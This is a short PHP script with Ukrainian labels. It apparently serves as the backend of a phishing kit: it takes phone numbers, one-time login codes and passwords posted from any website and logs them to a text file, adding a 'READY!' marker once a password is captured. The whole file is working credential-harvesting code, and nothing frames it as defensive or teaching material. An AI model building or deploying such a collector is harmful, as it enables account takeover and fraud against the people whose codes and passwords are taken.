<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=utf-8");

$phone = $_POST['phone'] ?? '';
$code = $_POST['code'] ?? '';
$type = $_POST['type'] ?? '';

$timestamp = date('Y-m-d H:i:s');
$file = 'data.txt';

if (!empty($phone)) {
    $data = "$timestamp | Номер: " . htmlspecialchars($phone) . "\n";
} elseif (!empty($code)) {
    $label = ($type === 'password') ? "Пароль" : "Код";
    $data = "$timestamp | $label: " . htmlspecialchars($code) . "\n";
    
    // Додаємо розділювач після пароля
    if ($type === 'password') {
        $data .= str_repeat("_", 55) . "READY!\n";
    }
} else {
    http_response_code(400);
    die(json_encode(['status' => 'error', 'message' => 'Не отримано даних']));
}

if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
    http_response_code(500);
    die(json_encode(['status' => 'error', 'message' => 'Помилка запису']));
}

echo json_encode(['status' => 'success']);
?>